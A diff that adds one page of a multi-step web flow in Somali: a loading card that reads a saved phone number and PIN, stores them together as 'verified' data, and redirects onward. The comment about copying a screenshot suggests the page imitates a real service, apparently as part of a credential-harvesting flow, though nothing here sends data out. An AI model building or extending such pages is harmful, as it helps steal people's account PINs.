@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hubinta</title>
+
+<style>
+
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#7ac943;
+  display:flex;
+  justify-content:center;
+  align-items:flex-end;
+  height:100vh;
+}
+
+/* CARD */
+.card{
+  width:100%;
+  max-width:420px;
+  background:#f3f3f3;
+  border-radius:30px 30px 0 0;
+  text-align:center;
+  padding:60px 20px;
+  animation:slideUp .6s ease;
+}
+
+@keyframes slideUp{
+  from{transform:translateY(80px);opacity:0;}
+  to{transform:translateY(0);opacity:1;}
+}
+
+/* LOADER CIRCLE */
+.loader{
+  width:110px;
+  height:110px;
+  margin:0 auto 25px;
+  border-radius:50%;
+  background:#8fd63f;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  box-shadow:0 0 25px rgba(122,201,67,0.6);
+}
+
+/* SPINNING RING */
+.ring{
+  width:70px;
+  height:70px;
+  border:6px solid rgba(255,255,255,0.4);
+  border-top:6px solid white;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  from{transform:rotate(0deg);}
+  to{transform:rotate(360deg);}
+}
+
+h2{
+  color:#7ac943;
+  margin-bottom:10px;
+}
+
+p{
+  color:#666;
+  font-size:18px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+  <div class="loader">
+      <div class="ring"></div>
+  </div>
+
+  <h2>Habaynta...</h2>
+  <p>Diyaarinaya xaqiijinta...</p>
+
+</div>
+
+<script>
+
+/* ===============================
+   LOAD DATA FROM PAGE 6
+================================= */
+
+const savedNumber = localStorage.getItem("phoneNumber");
+const savedPIN = localStorage.getItem("userPIN");
+
+/* CHECK DATA EXISTS */
+if(!savedNumber || !savedPIN){
+    alert("Data missing — restart process");
+    window.location.href="page3.html";
+}
+
+/* ===============================
+   KEEP DATA FLOW (VERY IMPORTANT)
+================================= */
+
+const sessionData = {
+    phone: savedNumber,
+    pin: savedPIN,
+    verified: true,
+    time: new Date().toLocaleString()
+};
+
+localStorage.setItem(
+    "verificationData",
+    JSON.stringify(sessionData)
+);
+
+/* ===============================
+   AUTO NEXT PAGE
+================================= */
+
+setTimeout(()=>{
+    document.body.style.opacity="0";
+
+    setTimeout(()=>{
+        window.location.href="page8.html";
+    },400);
+
+},5000); // 5 seconds like screenshot
+
+</script>
+
+</body>
+</html>
